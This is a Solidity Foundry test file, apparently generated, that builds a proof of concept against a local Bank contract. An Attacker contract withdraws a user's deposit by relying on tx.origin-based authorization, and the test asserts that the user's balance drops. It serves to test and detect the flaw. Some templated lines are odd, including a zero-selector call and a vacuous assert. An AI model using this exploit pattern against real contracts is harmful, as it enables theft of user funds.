

pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../Bank.sol";

contract Attacker {
    Bank public bank;
    constructor(Bank _bank) { bank = _bank; }
    function attack() external {
        bank.withdraw(5 ether);
    }
    receive() external payable {}
}

/* replaced abstract contracts[] cs; */

contract BankTest is Test {       
    address immutable bank_deployer;      
    Bank immutable bank;
    
    constructor() {
        // deploying a Bank contract
        bank_deployer = address(0xBEEF);
        vm.prank(bank_deployer);
        bank = new Bank();
    }
    
    function test_assets_dec_onlyif_deposit_violation() public {

        // PoC setup: deploy attacker and prepare user deposit
        Attacker attacker = new Attacker(bank);
        address user = address(0xABCD); vm.deal(user, 10 ether); vm.prank(user); bank.deposit{value: 10 ether}();
        assertNotEq(user, address(bank), "user address equal to bank address");

        uint256 user_credits_before = uint256(vm.load(address(bank), keccak256(abi.encode(user, uint256(0)))));

        address sender = user;
        // user calls attacker which in turn calls bank.withdraw (tx.origin == user, msg.sender == attacker)
        vm.prank(sender, user);
        attacker.attack();

        bytes4 function_selector = bytes4(0);
        uint256 msg_value = 0;
        bytes memory params = "";

        // Dynamically call the function with function_selector selector and passed parameters
        address(bank).call{value: msg_value}(abi.encodeWithSelector(function_selector, params));        
	
        assert(function_selector != bank.withdraw.selector || sender != user);

        uint256 user_credits_after = uint256(vm.load(address(bank), keccak256(abi.encode(user, uint256(0)))));
        assertLt(user_credits_after, user_credits_before, "user credits did not decrease");
    }
}

